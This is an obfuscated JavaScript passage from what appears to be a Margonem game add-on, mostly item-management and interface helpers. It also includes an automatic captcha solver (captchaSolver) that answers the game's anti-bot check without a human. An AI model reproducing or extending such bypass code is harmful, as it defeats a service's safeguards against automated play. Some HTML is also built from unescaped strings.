export function clearEntity() {
  const _0x187769 = [127406, 127396, 127411, 127416, 127421, 127426, 127431, 127434, 127401, 127402, 127403, 127404, 127405, 127370, 127371, 127372, 127373, 127374, 127375, 127376, 127377, 127378, 127379, 127382, 127383, 127384, 127385, 127386, 127391, 127392, 127393, 127394, 127395, 214424];
  _0x187769.forEach(_0x165289 => {
    try {
      const _0x322f87 = Engine.npcs.getById(_0x165289);
      if (!_0x322f87) {
        return;
      }
      try {
        _0x322f87.delete();
      } catch (_0x52f161) {
        console.error("Nie udało się usunąć NPC " + _0x165289 + ":", _0x52f161);
      }
    } catch (_0x1b36c8) {
      console.error("Błąd getById dla " + _0x165289 + ":", _0x1b36c8);
    }
  });
}
export async function captchaSolver(_0x2bcb1d) {
  const _0x1c967a = _0x2bcb1d.map((_0x10a26e, _0xe15546) => {
    if (_0x10a26e.startsWith("*") && _0x10a26e.endsWith("*")) {
      return _0xe15546;
    }
    return null;
  }).filter(_0xd9c585 => _0xd9c585 !== null).join(",");
  await waitForSeconds(3);
  _g("captcha&answerId=" + _0x1c967a, function (_0x2e4a0d) {
    if (_0x2e4a0d.captcha.done) {
      log("Zagadka rozwiązana: " + _0x1c967a);
    }
  });
}
export function calculateUnbindCost(_0x2413a2, _0x2d74ff) {
  _0x2413a2 = Math.round(_0x2413a2);
  let _0x53c8a8 = 10 + _0x2413a2 * 0.1;
  if (_0x2d74ff == 1) {
    if (Math.round(_0x53c8a8) > 20) {
      return 1500;
    }
    return Math.round(_0x53c8a8) * 75;
  }
  if (_0x2d74ff == 2) {
    if (_0x53c8a8 >= 20) {
      return 1800;
    }
    return Math.round(_0x53c8a8 * 1.2) * 75;
  }
  if (_0x2d74ff == 3) {
    if (_0x53c8a8 >= 30) {
      return 3375;
    }
    return Math.round(_0x53c8a8 * 1.5) * 75;
  }
  if (_0x2d74ff == 4) {
    if (_0x53c8a8 >= 30) {
      return 6750;
    }
    return Math.round(_0x53c8a8 * 3) * 75;
  }
}
export function showReminder(_0x2c4d24, _0x1594f6, _0x22649f = "PRZYPOMNIENIE") {
  let _0x38a9d1;
  const _0x5ade97 = new Audio("https://margoplus.pl/audio/colossus-alert.mp3");
  _0x5ade97.volume = 0.5;
  _0x5ade97.play();
  const _0x1b0e6b = $("<div class=\"mp-overlay-reminder\">\n      <div class=\"mp-overlay-reminder-box\">\n        <div class=\"mp-overlay-reminder-header\">" + _0x22649f + "</div>\n        <div class=\"mp-overlay-reminder-text\">" + _0x2c4d24 + "</div>\n      </div>\n  </div>\n  ").appendTo("#mp-root");
  _0x38a9d1 = setTimeout(() => {
    _0x1b0e6b?.fadeOut(500, function () {
      $(this).remove();
    });
  }, 3000);
}
export function removeAnvil() {
  $(".mp-scene")?.fadeOut(500, function () {
    $(this).remove();
  });
}
export function spawnAnvil() {
  $(".mp-scene")?.remove();
  const _0x1217b0 = document.querySelector(".game-layer");
  const _0x2499d1 = document.createElement("div");
  _0x2499d1.className = "mp-scene";
  const _0xbf3019 = document.createElement("div");
  _0xbf3019.className = "mp-anvil";
  const _0x5baa1b = document.createElement("div");
  _0x5baa1b.className = "mp-hammer";
  _0x2499d1.appendChild(_0xbf3019);
  _0xbf3019.appendChild(_0x5baa1b);
  _0x1217b0.appendChild(_0x2499d1);
}
export function addAnimatedBadge2(_0x28e794, _0x279ac7) {
  const _0x4899ad = document.querySelector(".loot-item-wrapper-" + _0x28e794);
  if (!_0x4899ad) {
    return;
  }
  const _0x1113be = document.createElement("div");
  _0x1113be.className = "animated-badge slot-roll";
  _0x4899ad.prepend(_0x1113be);
  let _0x2da4eb = 0;
  let _0x50e244 = 20;
  let _0x44d0de = 0;
  const _0x2654fc = 20;
  const _0x431b20 = setInterval(() => {
    _0x2da4eb = Math.floor(Math.random() * 100);
    _0x1113be.textContent = _0x2da4eb + "%";
    _0x44d0de++;
    if (_0x44d0de > _0x2654fc * 0.6) {
      _0x50e244 += 15;
      clearInterval(_0x431b20);
      setTimeout(_0x44971b, _0x50e244);
    }
    if (_0x44d0de >= _0x2654fc) {
      clearInterval(_0x431b20);
      _0xde1345();
    }
  }, _0x50e244);
  function _0x44971b() {
    const _0x40417e = setInterval(() => {
      _0x2da4eb = Math.floor(Math.random() * 100);
      _0x1113be.textContent = _0x2da4eb + "%";
    }, _0x50e244);
    setTimeout(() => {
      clearInterval(_0x40417e);
      _0xde1345();
    }, 2000);
  }
  function _0xde1345() {
    _0x1113be.textContent = _0x279ac7 + "%";
    const _0x14dfae = Number(_0x279ac7);
    const _0x242561 = {
      "0": "slot-lost",
      "100": "slot-win"
    };
    _0x1113be.classList.add(_0x242561[_0x14dfae] ?? (_0x14dfae > 0 && _0x14dfae < 100 ? "slot-remis" : ""));
  }
}
export function parseChangeToGetLegendary(_0x30170d, _0x10659b) {
  if (!Array.isArray(_0x10659b) || _0x10659b.length === 0) {
    return 0;
  }
  const _0x820f25 = Engine.hero.d.prof;
  const _0x970b2b = _0x30170d?.split("") || [];
  const _0x25c15e = _0x970b2b.some(_0x154f14 => _0x10659b.includes(_0x154f14));
  let _0xda38fc = 0;
  if (_0x25c15e) {
    if (!_0x30170d?.includes(_0x820f25)) {
      return 0;
    }
    for (let _0x455380 of _0x970b2b) {
      _0xda38fc += _0x10659b.filter(_0x48334f => _0x48334f === _0x455380).length;
    }
  } else {
    _0xda38fc = _0x10659b.length;
  }
  if (_0xda38fc === 0) {
    return 0;
  }
  if (_0x30170d?.includes(_0x820f25) && _0xda38fc === 1) {
    return 100;
  }
  return Math.floor(100 / _0xda38fc);
}
export function addAnimatedBadge(_0x2489be, _0x428068) {
  const _0x4c6256 = document.querySelector(".loot-item-wrapper-" + _0x2489be);
  if (!_0x4c6256) {
    return;
  }
  const _0x2562d9 = document.createElement("div");
  _0x2562d9.className = "animated-badge";
  _0x2562d9.textContent = _0x428068;
  _0x4c6256.prepend(_0x2562d9);
}
const gAsync = _0x22966a => new Promise(_0xc89fa2 => _g(_0x22966a, _0xc89fa2));
const isInCurrentTab = _0x1b3e74 => {
  const _0x2d4eb2 = Engine.depo.getVisible();
  const _0x11f1ed = 14;
  const _0x422949 = _0x2d4eb2 < 8 ? _0x2d4eb2 * _0x11f1ed : (_0x2d4eb2 - 8) * _0x11f1ed;
  const _0x6c2ad4 = _0x422949 + 13;
  const _0x5a42ad = _0x2d4eb2 < 8 ? 0 : 8;
  const _0x8ded27 = _0x2d4eb2 < 8 ? 7 : 15;
  return _0x1b3e74.x >= _0x422949 && _0x1b3e74.x <= _0x6c2ad4 && _0x1b3e74.y >= _0x5a42ad && _0x1b3e74.y <= _0x8ded27;
};
const filterItems = (_0x5e5932, _0x39b161) => Engine.items.fetchLocationItems(_0x5e5932).filter(_0x39b161);
const processItems = async (_0x5698a1, _0x365274, _0x2462e9 = 0.05) => {
  for (const _0x40450a of _0x5698a1) {
    const _0x2b3bd8 = await _0x365274(_0x40450a);
    await waitForSeconds(_0x2b3bd8 ? _0x2462e9 : 0.1);
  }
  $(".ess-selected").removeClass("ess-selected");
};
const listNuggets = ["Wykrywacz herosów", "Zwój orzeźwienia", "Złoty samorodek", "Podwójne widzenie", "Leczenie w walce", "Kupon na małą miksturę wyczerpania", "Kupon na miksturę wyczerpania", "Kupon na dużą miksturę wyczerpania", "Zwój wywołania depozytu", "Zwój wywołania poczty", "Zwój wywołania aukcji", "Zwój wywołania depozytu klanowego", "Zwój zbiega", "Zwój wywołania sklepu", "Pieśń przebudzenia", "Melodia wieków", "Diabelskie struny", "Werble ochronne", "Elfia kołysanka", "Rozkaz bojowy", "Fletnia opiekuna lasów", "Zaklęte kastaniety", "Ulga dla przeciążonych", "Utrwalenie stroju", "Utrwalenie chowańca", "Doskonała skrzynia Smoczych Kowali", "Modyfikator celu podróży", "Poszerzacz depozytu", "Plecak mistrza teleportacji", "Pożeracz doświadczenia", "Poszerzacz zestawów do walki", "Unikatowy blankiet na strój", "Heroiczny blankiet na strój"];
export const getItemsFromDepoAllByNugget = () => filterItems("d", _0x31c32c => _0x31c32c.st == 0 && !_0x31c32c._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(_0x31c32c.name) >= 0);
export const getItemsFromDepoTabByNugget = () => filterItems("d", _0x53a3cd => _0x53a3cd.st == 0 && !_0x53a3cd._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(_0x53a3cd.name) >= 0 && isInCurrentTab(_0x53a3cd));
export const getItemsFromEqByNugget = () => filterItems("g", _0x15630a => _0x15630a.st == 0 && !_0x15630a._cachedStats.hasOwnProperty("nodepo") && listNuggets.indexOf(_0x15630a.name) >= 0);
export const getItemsFromTabByName = _0x4ca177 => filterItems("d", _0x5c078a => _0x5c078a.st == 0 && _0x5c078a.name === _0x4ca177 && isInCurrentTab(_0x5c078a) && !_0x5c078a._cachedStats.hasOwnProperty("nodepo") && !_0x5c078a._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
export const getItemsFromAllByName = _0x53ff60 => filterItems("d", _0x367ea5 => _0x367ea5.st == 0 && _0x367ea5.name === _0x53ff60 && !_0x367ea5._cachedStats.hasOwnProperty("nodepo") && !_0x367ea5._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
export const getItemsFromDepoAllByType = (_0x4e8240, _0x25f55f, _0x3b7d4e) => filterItems("d", _0x1dd2c1 => _0x1dd2c1.st === 0 && validateItemsForType(_0x25f55f, _0x3b7d4e, _0x1dd2c1) && getClGroup(_0x1dd2c1.cl) == _0x4e8240);
export const getItemsFromDepoTabByType = (_0x5b356f, _0x4c0879, _0x4d91f0) => filterItems("d", _0x352c96 => _0x352c96.st === 0 && validateItemsForType(_0x4c0879, _0x4d91f0, _0x352c96) && getClGroup(_0x352c96.cl) == _0x5b356f && isInCurrentTab(_0x352c96));
export const getItemsFromEqByType = (_0x38d3e3, _0x4689e8, _0x391f0b) => filterItems("g", _0x10f9d3 => _0x10f9d3.st === 0 && validateItemsForType(_0x4689e8, _0x391f0b, _0x10f9d3) && getClGroup(_0x10f9d3.cl) == _0x38d3e3 && isInCurrentTab(_0x10f9d3));
const _0x54a5b7 = {
  npc_lootbon: _0x1f1e05 => _0x1f1e05.npc_lootbon,
  quest_expbon: _0x556e93 => _0x556e93.quest_expbon,
  npc_expbon: _0x242c81 => _0x242c81.npc_expbon,
  honorbon: _0x99fc00 => _0x99fc00.honorbon
};
const bonusMap = _0x54a5b7;
export const getItemsFromDepoAllByBlessBonus = _0x2480ba => filterItems("d", _0x5795c8 => _0x5795c8.st === 0 && !_0x5795c8._cachedStats.hasOwnProperty("nodepo") && _0x5795c8.cl === 25 && (_0x5795c8._cachedStats.legbon?.includes(_0x2480ba) || bonusMap[_0x2480ba]?.(_0x5795c8._cachedStats)));
export const getItemsFromDepoTabByBlessBonus = _0x4c78db => filterItems("d", _0x2272f1 => _0x2272f1.st === 0 && !_0x2272f1._cachedStats.hasOwnProperty("nodepo") && _0x2272f1.cl === 25 && (_0x2272f1._cachedStats.legbon?.includes(_0x4c78db) || bonusMap[_0x4c78db]?.(_0x2272f1._cachedStats)) && isInCurrentTab(_0x2272f1));
export const getItemsFromEqByBlessBonus = _0x2a13ac => filterItems("g", _0x1b94fe => _0x1b94fe.st === 0 && !_0x1b94fe._cachedStats.hasOwnProperty("nodepo") && _0x1b94fe.cl === 25 && (_0x1b94fe._cachedStats.legbon?.includes(_0x2a13ac) || bonusMap[_0x2a13ac]?.(_0x1b94fe._cachedStats)));
export const getItemsFromDepoAllByComponentsTier1 = () => filterItems("d", _0x5a9d38 => _0x5a9d38.st == 0 && !_0x5a9d38._cachedStats.hasOwnProperty("nodepo") && (_0x5a9d38._cachedStats.opis?.includes("poziomie 20-100") || (_0x5a9d38.cl === 28 || _0x5a9d38.cl === 26) && _0x5a9d38._cachedStats?.target_min_lvl == 20));
export const getItemsFromDepoAllByComponentsTier2 = () => filterItems("d", _0x28150c => _0x28150c.st == 0 && !_0x28150c._cachedStats.hasOwnProperty("nodepo") && (_0x28150c._cachedStats.opis?.includes("poziomie 101-200") || (_0x28150c.cl === 28 || _0x28150c.cl === 26) && _0x28150c._cachedStats?.target_min_lvl == 101));
export const getItemsFromDepoAllByComponentsTier3 = () => filterItems("d", _0x48a44a => _0x48a44a.st == 0 && !_0x48a44a._cachedStats.hasOwnProperty("nodepo") && (_0x48a44a._cachedStats.opis?.includes("poziomie 201-300") || (_0x48a44a.cl === 28 || _0x48a44a.cl === 26) && _0x48a44a._cachedStats?.target_min_lvl == 201));
export const getItemsFromDepoTabByComponentsTier1 = () => filterItems("d", _0x344df3 => _0x344df3.st == 0 && isInCurrentTab(_0x344df3) && !_0x344df3._cachedStats.hasOwnProperty("nodepo") && (_0x344df3._cachedStats.opis?.includes("poziomie 20-100") || (_0x344df3.cl === 28 || _0x344df3.cl === 26) && _0x344df3._cachedStats?.target_min_lvl == 20));
export const getItemsFromDepoTabByComponentsTier2 = () => filterItems("d", _0x5c2110 => _0x5c2110.st == 0 && isInCurrentTab(_0x5c2110) && !_0x5c2110._cachedStats.hasOwnProperty("nodepo") && (_0x5c2110._cachedStats.opis?.includes("poziomie 101-200") || (_0x5c2110.cl === 28 || _0x5c2110.cl === 26) && _0x5c2110._cachedStats?.target_min_lvl == 101));
export const getItemsFromDepoTabByComponentsTier3 = () => filterItems("d", _0x1c8549 => _0x1c8549.st == 0 && isInCurrentTab(_0x1c8549) && !_0x1c8549._cachedStats.hasOwnProperty("nodepo") && (_0x1c8549._cachedStats.opis?.includes("poziomie 201-300") || (_0x1c8549.cl === 28 || _0x1c8549.cl === 26) && _0x1c8549._cachedStats?.target_min_lvl == 201));
export const getItemsFromEqByComponentsTier1 = () => filterItems("g", _0x1fa4e5 => _0x1fa4e5.st == 0 && !_0x1fa4e5._cachedStats.hasOwnProperty("nodepo") && (_0x1fa4e5._cachedStats.opis?.includes("poziomie 20-100") || (_0x1fa4e5.cl === 28 || _0x1fa4e5.cl === 26) && _0x1fa4e5._cachedStats?.target_min_lvl == 20));
export const getItemsFromEqByComponentsTier2 = () => filterItems("g", _0x391a1b => _0x391a1b.st == 0 && !_0x391a1b._cachedStats.hasOwnProperty("nodepo") && (_0x391a1b._cachedStats.opis?.includes("poziomie 101-200") || (_0x391a1b.cl === 28 || _0x391a1b.cl === 26) && _0x391a1b._cachedStats?.target_min_lvl == 101));
export const getItemsFromEqByComponentsTier3 = () => filterItems("g", _0x444076 => _0x444076.st == 0 && !_0x444076._cachedStats.hasOwnProperty("nodepo") && (_0x444076._cachedStats.opis?.includes("poziomie 201-300") || (_0x444076.cl === 28 || _0x444076.cl === 26) && _0x444076._cachedStats?.target_min_lvl == 201));
export const getItemsFromDepoTabByChest = () => filterItems("d", _0x5bbd4e => _0x5bbd4e.st == 0 && !_0x5bbd4e._cachedStats.hasOwnProperty("nodepo") && _0x5bbd4e._cachedStats.opis?.includes("Zawiera jedną losową część przebrania") && isInCurrentTab(_0x5bbd4e));
export const getItemsFromDepoAllByChest = () => filterItems("d", _0x897bab => _0x897bab.st == 0 && !_0x897bab._cachedStats.hasOwnProperty("nodepo") && _0x897bab._cachedStats.opis?.includes("Zawiera jedną losową część przebrania"));
export const getItemsFromEqByChest = () => filterItems("g", _0x1a49cc => _0x1a49cc.st == 0 && !_0x1a49cc._cachedStats.hasOwnProperty("nodepo") && _0x1a49cc._cachedStats.opis?.includes("Zawiera jedną losową część przebrania"));
export const getItemsFromDepoAllBySkinItems = () => filterItems("d", _0x3f6063 => _0x3f6063.st == 0 && !_0x3f6063._cachedStats.hasOwnProperty("nodepo") && _0x3f6063._cachedStats.opis?.includes("legendarnego stroju"));
export const getItemsFromDepoTabBySkinItems = () => filterItems("d", _0x26f312 => _0x26f312.st == 0 && !_0x26f312._cachedStats.hasOwnProperty("nodepo") && _0x26f312._cachedStats.opis?.includes("legendarnego stroju") && isInCurrentTab(_0x26f312));
export const getItemsFromEqBySkinItems = () => filterItems("g", _0x467cf5 => _0x467cf5.st == 0 && !_0x467cf5._cachedStats.hasOwnProperty("nodepo") && _0x467cf5._cachedStats.opis?.includes("legendarnego stroju"));
export const getItemsFromDepoAllByCoupon = () => filterItems("d", _0xcdade9 => _0xcdade9.st == 0 && !_0xcdade9._cachedStats.hasOwnProperty("nodepo") && (_0xcdade9._cachedStats.opis?.includes("Kupon") || _0xcdade9.name.includes("kupon")));
export const getItemsFromDepoTabByCoupon = () => filterItems("d", _0x1a2070 => _0x1a2070.st == 0 && !_0x1a2070._cachedStats.hasOwnProperty("nodepo") && (_0x1a2070._cachedStats.opis?.includes("Kupon") || _0x1a2070.name.includes("kupon")) && isInCurrentTab(_0x1a2070));
export const getItemsFromEqByCoupon = () => filterItems("g", _0x4efc49 => _0x4efc49.st == 0 && !_0x4efc49._cachedStats.hasOwnProperty("nodepo") && (_0x4efc49._cachedStats.opis?.includes("Kupon") || _0x4efc49.name.includes("kupon")));
export const getItemsFromDepoAllByExp = () => filterItems("d", _0x2ab0f9 => _0x2ab0f9.st == 0 && _0x2ab0f9._cachedStats.expadd);
export const getItemsFromDepoTabByExp = () => filterItems("d", _0x18cc8d => _0x18cc8d.st == 0 && !_0x18cc8d._cachedStats.hasOwnProperty("nodepo") && _0x18cc8d._cachedStats.expadd && isInCurrentTab(_0x18cc8d));
export const getItemsFromEqByExp = () => filterItems("g", _0x2b091c => _0x2b091c.st == 0 && !_0x2b091c._cachedStats.hasOwnProperty("nodepo") && _0x2b091c._cachedStats.expadd);
export const getItemsFromDepoAllByPkt = () => filterItems("d", _0x34661d => _0x34661d.st == 0 && !_0x34661d._cachedStats.hasOwnProperty("nodepo") && _0x34661d._cachedStats.hasOwnProperty("enhancement_add_point"));
export const getItemsFromDepoTabByPkt = () => filterItems("d", _0x17cb5d => _0x17cb5d.st == 0 && !_0x17cb5d._cachedStats.hasOwnProperty("nodepo") && _0x17cb5d._cachedStats.hasOwnProperty("enhancement_add_point") && isInCurrentTab(_0x17cb5d));
export const getItemsFromEqByPkt = () => filterItems("g", _0x4a51e0 => _0x4a51e0.st == 0 && !_0x4a51e0._cachedStats.hasOwnProperty("nodepo") && _0x4a51e0._cachedStats.hasOwnProperty("enhancement_add_point"));
export const getItemsFromDepoAllByDust = () => filterItems("d", _0x1e818f => _0x1e818f.st == 0 && !_0x1e818f._cachedStats.hasOwnProperty("nodepo") && (_0x1e818f._cachedStats.hasOwnProperty("upgtimelimit") || _0x1e818f._cachedStats?.opis?.includes("pyłu astralnego")));
export const getItemsFromDepoTabByDust = () => filterItems("d", _0x4e85ee => _0x4e85ee.st == 0 && !_0x4e85ee._cachedStats.hasOwnProperty("nodepo") && (_0x4e85ee._cachedStats.hasOwnProperty("upgtimelimit") || _0x4e85ee._cachedStats.opis?.includes("pyłu astralnego")) && isInCurrentTab(_0x4e85ee));
export const getItemsFromEqByDust = () => filterItems("g", _0x169ed2 => _0x169ed2.st == 0 && !_0x169ed2._cachedStats.hasOwnProperty("nodepo") && (_0x169ed2._cachedStats.hasOwnProperty("upgtimelimit") || _0x169ed2._cachedStats.opis?.includes("pyłu astralnego")));
export const getItemsFromDepoAllByExpiries = () => {
  const _0x3cdeb1 = Math.ceil(ts() / 1000);
  return filterItems("d", _0x376c34 => _0x376c34.st == 0 && !_0x376c34._cachedStats.hasOwnProperty("nodepo") && _0x376c34._cachedStats.expires && _0x3cdeb1 > _0x376c34._cachedStats.expires);
};
export const getItemsFromDepoTabByExpiries = () => {
  const _0x1c4353 = Math.ceil(ts() / 1000);
  return filterItems("d", _0x20b8ba => _0x20b8ba.st == 0 && !_0x20b8ba._cachedStats.hasOwnProperty("nodepo") && _0x20b8ba._cachedStats.expires && _0x1c4353 > _0x20b8ba._cachedStats.expires && isInCurrentTab(_0x20b8ba));
};
export const getItemsFromEqByExpiries = () => {
  const _0x416fe5 = Math.ceil(ts() / 1000);
  return filterItems("g", _0x4a0bbc => _0x4a0bbc.st == 0 && !_0x4a0bbc._cachedStats.hasOwnProperty("nodepo") && _0x4a0bbc._cachedStats.expires && _0x416fe5 > _0x4a0bbc._cachedStats.expires && !_0x4a0bbc._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
};
export const getItemsFromEqByName = _0x5385f2 => filterItems("g", _0x2d6afa => _0x2d6afa.name === _0x5385f2 && _0x2d6afa.st === 0 && !_0x2d6afa._cachedStats.hasOwnProperty("nodepo") && !_0x2d6afa._cachedStats.hasOwnProperty("enhancement_upgrade_lvl"));
const validateItems = (_0x1dfe33, _0x503218, _0x237c1f) => {
  const _0x14d22f = _0x237c1f._cachedStats;
  if (!_0x14d22f) {
    return false;
  }
  if (_0x14d22f.rarity !== _0x1dfe33) {
    return false;
  }
  if ([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(_0x237c1f.cl) >= 0 && !_0x503218.other.eq) {
    return false;
  }
  if (_0x503218?.cl?.hasOwnProperty(_0x237c1f.cl) && !_0x503218.cl[_0x237c1f.cl]) {
    return false;
  }
  const _0x477988 = _0x14d22f?.opis?.toLowerCase() ?? "";
  if (_0x477988?.includes("event") && !_0x503218.other.lic) {
    return false;
  }
  if (_0x477988?.includes("kopalnia") && !_0x503218.other.kopa) {
    return false;
  }
  if (_0x14d22f.hasOwnProperty("nodepo")) {
    return false;
  }
  if (_0x14d22f.hasOwnProperty("enhancement_upgrade_lvl")) {
    return false;
  }
  if (_0x14d22f.hasOwnProperty("soulbound") && !_0x503218.bind) {
    return false;
  }
  if (_0x14d22f.hasOwnProperty("permbound") && !_0x503218.bind) {
    return false;
  }
  return true;
};
const validateItemsForType = (_0x2a10cb, _0x192e24, _0x4f3f4a) => {
  const _0x1733fe = _0x4f3f4a._cachedStats;
  if (!_0x1733fe) {
    return false;
  }
  if (_0x1733fe.rarity !== _0x2a10cb) {
    return false;
  }
  if ([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29].indexOf(_0x4f3f4a.cl) < 0) {
    return false;
  }
  const _0x50b0a1 = _0x1733fe?.opis?.toLowerCase() ?? "";
  if (_0x50b0a1?.includes("event") && !_0x192e24.other.lic) {
    return false;
  }
  if (_0x50b0a1?.includes("kopalnia") && !_0x192e24.other.kopa) {
    return false;
  }
  if (_0x1733fe.hasOwnProperty("nodepo")) {
    return false;
  }
  if (_0x1733fe.hasOwnProperty("enhancement_upgrade_lvl")) {
    return false;
  }
  if (_0x1733fe.hasOwnProperty("soulbound") && !_0x192e24.bind) {
    return false;
  }
  if (_0x1733fe.hasOwnProperty("permbound") && !_0x192e24.bind) {
    return false;
  }
  return true;
};
export const getItemArrayFromLocWithValid = (_0x1e9cfa, _0x4e3915, _0x3bb717) => {
  const _0x4df32d = Engine.items.fetchLocationItems(_0x1e9cfa);
  let _0x22fdbe = [];
  for (const _0x5e1386 of _0x4df32d) {
    if (_0x1e9cfa == "d" && validateItems(_0x4e3915, _0x3bb717, _0x5e1386) && _0x5e1386.st == 0 && (!_0x3bb717.tab || isInCurrentTab(_0x5e1386))) {
      _0x22fdbe.push(_0x5e1386.id);
    }
    if (_0x1e9cfa == "g" && validateItems(_0x4e3915, _0x3bb717, _0x5e1386) && _0x5e1386.st == 0) {
      _0x22fdbe.push(_0x5e1386.id);
    }
  }
  return _0x22fdbe;
};
export const depoItemPutGeneric = async (_0x378397, _0x31606f = () => {}) => {
  const _0x2134cb = Engine.depo.getVisible();
  const _0x21ea11 = Engine.depo.getDepoItemTable();
  const _0x4ed258 = Engine.depo.getCardItems();
  if (_0x4ed258[_0x2134cb] > 111) {
    return message("Brak miejsca w tej zakładce");
  }
  const _0x5a8e8c = _0x2134cb < 8 ? _0x2134cb * 14 : (_0x2134cb - 8) * 14;
  const _0x5beed6 = _0x5a8e8c + 13;
  const _0x3af1b6 = _0x2134cb < 8 ? 0 : 8;
  const _0x319278 = _0x2134cb < 8 ? 7 : 15;
  for (let _0x147639 = _0x3af1b6; _0x147639 <= _0x319278; _0x147639++) {
    for (let _0x11328f = _0x5a8e8c; _0x11328f <= _0x5beed6; _0x11328f++) {
      if (!_0x21ea11[_0x11328f] || !_0x21ea11[_0x11328f][_0x147639]) {
        const _0x5514ae = await gAsync("depo&put=" + _0x378397 + "&x=" + _0x11328f + "&y=" + _0x147639 + "&answer=1");
        if (_0x5514ae.item) {
          await _0x31606f();
        }
        return;
      }
    }
  }
};
export const enhancementOnClickReagent = async _0x4bf33f => {
  try {
    Engine.crafting.enhancement.enchant.onClickReagent(_0x4bf33f);
  } catch (_0x2fda63) {}
};
export const getSlots = () => {
  return Engine.bags[0][0] - Engine.bags[0][1] + Engine.bags[1][0] - Engine.bags[1][1] + Engine.bags[2][0] - Engine.bags[2][1];
};
export const startPutItems = async (_0x590743, _0x1663aa = depoItemPutGeneric) => await processItems(_0x590743, async _0x574ff2 => {
  const _0x522776 = Engine.depo.getVisible();
  const _0x50594d = Engine.depo.getCardItems();
  if (_0x50594d[_0x522776] > 111) {
    message("Brak miejsca w tej zakładce");
    return false;
  }
  await _0x1663aa(_0x574ff2);
  return true;
});
export const startGetItems = async _0x4522b9 => await processItems(_0x4522b9, async _0x59e88b => {
  if (getSlots() < 1) {
    message("Brak miejsca w torbach");
    return false;
  }
  const _0xd4d06c = await gAsync("depo&get=" + _0x59e88b);
  return !!_0xd4d06c.item;
});
export const startPutEnhacement = async _0x17bdfb => await processItems(_0x17bdfb, async _0x169569 => {
  const _0x410de9 = Engine.items.getItemById(_0x169569);
  await enhancementOnClickReagent(_0x410de9);
  return true;
});
export const startGetEnhacement = startPutEnhacement;
export const startPutTrade = async _0xaaa334 => await processItems(_0xaaa334, async _0x208fbf => {
  const _0xb24a00 = Engine.items.getItemById(_0x208fbf);
  await Engine.trade.setSellItem(_0xb24a00);
  return true;
});
export const startGetTrade = async _0x20c1e2 => await processItems(_0x20c1e2, async _0x1ea445 => {
  const _0x1e0115 = await gAsync("trade&a=del&tid=" + _0x1ea445);
  if (_0x1e0115.item) {
    Engine.trade.removeTradeItem(_0x1ea445);
  }
  return !!_0x1e0115.item;
});
export const startGetSelect = async _0x40f42d => await processItems(_0x40f42d, async _0xe26fbe => {
  if (getSlots() < 1) {
    message("Brak miejsca w torbach");
    return false;
  }
  const _0x211da3 = await gAsync("depo&get=" + _0xe26fbe);
  return !!_0x211da3.item;
});
export const startPutSelect = async _0x435429 => await processItems(_0x435429, async _0xb4648f => await depoItemPutGeneric(_0xb4648f));
export const countNickData = (_0x1ae7fd, _0x35a263) => {
  const _0x1968c6 = {};
  for (let _0x4a531a in _0x1ae7fd) {
    const _0x8b1fae = _0x1ae7fd[_0x4a531a];
    const _0x34d1c9 = _0x8b1fae.getNick();
    if (!_0x1968c6[_0x34d1c9]) {
      _0x1968c6[_0x34d1c9] = {
        check: 0,
        all: 0
      };
    }
    _0x1968c6[_0x34d1c9].all++;
    if (_0x8b1fae.rx < 0 && _0x8b1fae.ry < 0) {
      _0x1968c6[_0x34d1c9].check++;
    }
  }
  return _0x1968c6[_0x35a263];
};
export const findNearestPointWithinRadius = (_0x546134, _0x5b9b95, _0x1f2ed8) => {
  let _0x16b69b = null;
  let _0x436e1a = _0x1f2ed8 * _0x1f2ed8;
  let _0x1620ec = 0;
  for (let _0x51a4e4 in _0x546134) {
    const _0x3897b4 = _0x546134[_0x51a4e4];
    const _0xb52958 = _0x3897b4.getKind();
    if (_0xb52958 === 0 && _0x3897b4.rx >= 0 && _0x3897b4.ry >= 0) {
      _0x1620ec++;
      const _0x4be05a = _0x3897b4.rx - _0x5b9b95.x;
      const _0x2da2c5 = _0x3897b4.ry - _0x5b9b95.y;
      const _0x1a60d4 = _0x4be05a * _0x4be05a + _0x2da2c5 * _0x2da2c5;
      if (_0x1a60d4 <= _0x436e1a) {
        _0x16b69b = _0x3897b4;
        _0x436e1a = _0x1a60d4;
      }
    }
  }
  return _0x16b69b;
};
const BLESS_KEYS = [["npc_lootbon", "LOOT"], ["quest_expbon", "QUE"], ["npc_expbon", "EXP"], ["honorbon", "PH"]];
const DMG_KEYS = ["fire", "frost", "wound", "light", "poison"];
const LEVEL_CLASSES = new Set([1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 29]);
const REMOVE_SELECTOR = ".mp-label-legbon, .mp-label-upgrade-level, .mp-label-bless,.mp-label-level, .mp-label-healing, .mp-label-damage, .mp-label-comp";
const COMP_TIERS = {
  "20": "T1",
  "101": "T2",
  "201": "T3"
};
export function createLabelsItems(_0x21e6da, _0x262239, _0x19b57c = false) {
  if (!_0x21e6da?._cachedStats) {
    return;
  }
  const _0x459eb8 = _0x21e6da._cachedStats;
  const _0x111e1b = _0x19b57c ? document.querySelectorAll(".item-id-" + _0x21e6da.id) : _0x21e6da.$[0];
  if (!_0x111e1b) {
    return;
  }
  const _0x37e64a = [];
  const _0x103b39 = _0x459eb8.socket_fleeting_legbon ?? _0x459eb8.socket_injection_legbon ?? _0x459eb8.legbon_test ?? _0x459eb8.legbon;
  if (_0x103b39) {
    const _0x51838d = String(_0x103b39).split(",", 1)[0];
    const _0x3ce8f7 = _0x262239[_0x51838d];
    if (_0x3ce8f7) {
      _0x37e64a.push("<div class=\"mp-basic-label mp-label-legbon\">" + _0x3ce8f7 + "</div>");
    }
  }
  if (_0x459eb8.enhancement_upgrade_lvl >= 0) {
    _0x37e64a.push("<div class=\"mp-basic-label mp-label-upgrade-level\">" + _0x459eb8.enhancement_upgrade_lvl + "</div>");
  }
  if (_0x21e6da.cl === 25) {
    const _0x1c5a7d = BLESS_KEYS.find(([_0x52e9e9]) => _0x459eb8[_0x52e9e9]);
    if (_0x1c5a7d) {
      _0x37e64a.push("<div class=\"mp-basic-label mp-label-bless\">" + _0x1c5a7d[1] + "</div>");
    }
  }
